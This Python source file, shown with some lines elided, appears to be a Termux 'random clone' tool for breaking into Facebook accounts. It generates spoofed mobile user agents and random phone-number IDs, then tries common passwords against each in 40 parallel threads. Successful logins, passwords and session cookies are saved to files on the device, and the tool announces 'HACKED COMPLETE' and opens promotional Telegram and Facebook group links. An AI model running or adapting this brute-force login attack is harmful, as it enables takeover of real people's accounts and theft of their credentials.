...
for ua in range(10000):
      ...
      aShishir=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(aShishir)
for ua in range(5000):
      ...
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      Shishirb=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(Shishirb)
for ua in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	...
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	Shishirc=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(Shishirc)
for ua in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	...
	h='Mobile Safari/537.36'
	Shishirj=(f"{a} {b}; {xs} {nx} {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(Shishirj)


#--os.system("xdg-open https://t.me/Ràndom_crack_termux_all_free_command")
logo =("""
\033[1;32m    ┏┓┓┏┳┏┓┓┏┳┳┓
\033[1;36m    ┗┓┣┫┃┗┓┣┫┃┣┫
\033[1;32m    ┗┛┛┗┻┗┛┛┗┻┛┗
\033[1;91m╔═════════════════════════╗
\033[1;92m  𝑹𝒂𝒏𝒅𝒐𝒎 𝑪𝒍𝒐𝒏𝒆 = ᏙᎬᎡՏᏆϴΝ = 1.0
\033[1;91m╚═════════════════════════╝
""") 
 
def Shishir():
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/groups/994023942456329/?ref=share&mibextid=NSMWBT')
    print(logo)
    print("")
    print("\033[1;96m ╔═════════════════════════════════╗")
    ...
    print("\033[1;96m ╚═════════════════════════════════╝")
    print("")
    Shishir = input(f'\033[1;32m ՏᎬᏞᎬᏟͲᎬᎠ ƳϴႮᎡ ϴᏢͲᏆϴΝ :\033[1;36m ')
    if Shishir in ["1","A"]:
        Shishirs()
    if Shishir in ["2","B"]:
        os.system('xdg-open https://facebook.com/groups/994023942456329/')
    if Shishir in ["3","C"]:
        os.system('xdg-open https://m.me/j/AbY4gbKvvlg4Xp3r')
    if Shishir in ["0","X"]:
        os.system('exit')
...
def Shishirs():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=40) as Random_crack:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print("\033[1;91m╔═════════════════════════════════════╗")
        ...
        print(f'\033[1;91m║\033[1;92m Random On Fire 🥵 ')
        print("\033[1;91m╚═════════════════════════════════════╝")
        for love in user:
            pwx = [love,love[2:],code+love[:3],'FreeFire','Pubg123','TikTok','Alh4aj']
            uid = code+love
            Random_crack.submit(Shishirm,uid,pwx,tl)
    print("\033[1;91m╔═══════════════════════════╗")
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HACKED COMPLETE ')
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HI IM Shishir ')
    print("\033[1;91m╚═══════════════════════════╝")


def Shishirm(uid,pwx,tl):
    global loop
    global cps
    global oks
    global agents
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f'\033[1;96m[\033[1;92m𝕾𝖍𝖎𝖘𝖍𝖎𝖗-𝖔𝖐\033[1;96m]\033[1;92m '+uid+' \033[1;96m◉\033[1;92m '+ps+'')
                print(f'\033[1;36mᏟϴϴᏦᏆᎬ : \033[1;35m'+coki)
                open('/sdcard/Shishir-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;90m[𝕾𝖍𝖎𝖘𝖍𝖎𝖗-ᏟᏢ] '+uid+' ◉ '+ps+' \n')
                open('/sdcard/Shishir-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
